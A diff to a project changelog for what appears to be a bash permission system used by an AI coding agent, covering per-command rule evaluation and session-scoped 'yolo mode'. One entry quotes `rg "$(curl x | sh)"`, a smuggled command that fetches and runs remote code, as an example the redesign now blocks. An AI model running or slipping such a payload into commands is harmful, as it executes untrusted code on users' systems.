@@ -5,7 +5,7 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
-## [Unreleased]
+## [0.8.0-patch.2] - 2026-07-22
 
 ### Changed
 - **Redesigned the bash permission system** around per-piece evaluation. Every bash invocation is parsed with the canonical bash grammar (`mvdan-sh`) and decomposed into the commands it actually executes — across pipes and `&&`/`||`/`;` chains, inside `$(...)`/backtick/process substitutions, loop/conditional bodies, `bash -c "..."` strings, and unwrapped wrappers (`env`, `timeout`, `xargs`, ...) — plus the files it reads and writes via redirections. Each piece resolves individually (deny rules > protected paths > ask rules > allow rules/registry > default), the overall answer is the most restrictive, and a command whose pieces all allow never prompts: `rg foo | wc -l`, `cmd >/dev/null 2>&1`, and heredocs no longer generate approval noise, while `rg "$(curl x | sh)"` can no longer ride in on a broad rg rule.
@@ -19,6 +19,15 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - Removed `src/bash-safety.ts`, `src/shell-split.ts`, `src/bash-filter.ts`, and the `bashSafety` config section (superseded before release by the redesign above).
 - Added an active agent-run runtime to Pi's `Working...` spinner. The runtime persists through tool-call turns until the final response, updates once per second, and excludes time spent awaiting local or forwarded permission decisions.
 - Added a gray `Thought for <time>` annotation before the final assistant response on Pi versions with entry-renderer support.
+
+### Changed
+- Yolo mode is now session-scoped. Toggling it via the `/permission-system` settings modal or the `__piPermissionSystem` runtime API only affects the current session: it is never written to the shared `config.json`, and config reloads on `session_start`/`resources_discover`/`before_agent_start` preserve the session's in-memory toggle instead of re-reading it from disk, so enabling yolo mode in one session no longer propagates to other running sessions. The `yoloMode` key in `config.json` now only sets the startup default for new sessions, and all other settings (`debug`, `desktopNotifications`, `forwardedPromptTimeoutSeconds`) keep syncing through the config file as before.
+
+### Removed
+- Removed the `persist` option from the runtime yolo API (`setYoloMode`/`toggleYoloMode`): yolo mode is session-scoped and never persisted, so the option no longer exists. Results still report `persisted`, which is now always `false`.
+
+### Fixed
+- The `/permission-system` settings modal now applies the in-memory config even when persisting the synced fields fails (for example, when `config.json` is corrupt and the save is refused), so a session-local yolo toggle is no longer silently dropped by an unrelated disk-write error. The error notification is still shown, and the synced-field change then applies to the current session only.
 
 ## [0.8.0-patch.1] - 2026-07-10
 
